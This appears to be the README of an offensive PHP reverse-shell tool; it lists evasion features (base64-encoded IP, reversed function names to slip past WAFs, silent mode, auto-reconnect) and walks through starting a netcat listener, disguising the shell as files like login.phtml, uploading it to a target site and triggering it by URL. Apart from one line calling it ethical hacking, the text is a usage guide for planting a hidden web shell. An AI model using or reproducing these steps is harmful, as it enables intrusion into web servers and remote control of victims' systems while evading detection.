## PHP Reverse Shell (Powerful & Stealthy)
This is a powerful and stealthy PHP reverse shell designed for ethical hacking and penetration testing.
It quietly connects back to your machine reliably without showing any output.

## Features
- IP and shell command are Base64 encoded for stealth and easy customization

- Function names are reversed to bypass WAF and security filters

- Silent mode — no output displayed to avoid detection

- Automatically reconnects if connection drops

- Can run as a background daemon (if server supports)

- Works on most PHP-enabled servers

- Supports tunneling services like Cloudflared, Ngrok, Serveo, and others

- Upload with `.phtml` extension to bypass some filters

  ## How to Use
**1. Start a listener on your machine**
```bash
nc -lvnp 4444
```
**2. Encode your IP or hostname in Base64**

Use this simple command:

```bash
echo "your_ip_or_hostname" | base64
```
**Example:**
```bash
echo "192.168.1.5" | base64
```
Copy the output and replace the $ip_b64 value in the PHP script.

**3. Update the PHP script**  

Change these lines with your Base64 encoded IP/hostname and port:

```php
$ip_b64 = 'YOUR_BASE64_ENCODED_IP_OR_HOSTNAME';
$port = YOUR_LISTENER_PORT;
```
**4. Rename the file and upload**

Rename the file to something less suspicious, for example:

- `login.phtml`

- `avatar.phtml`

- `update.phtml`

  Using the `.phtml` extension helps the file run on some servers that block `.php`.

 Upload this file to the target website where file uploads are allowed.

**5. Trigger the reverse shell**

Open the uploaded file in a browser:

```arduino
http://target.com/uploads/login.phtml
```
Once opened, your listener will get a reverse shell connection.
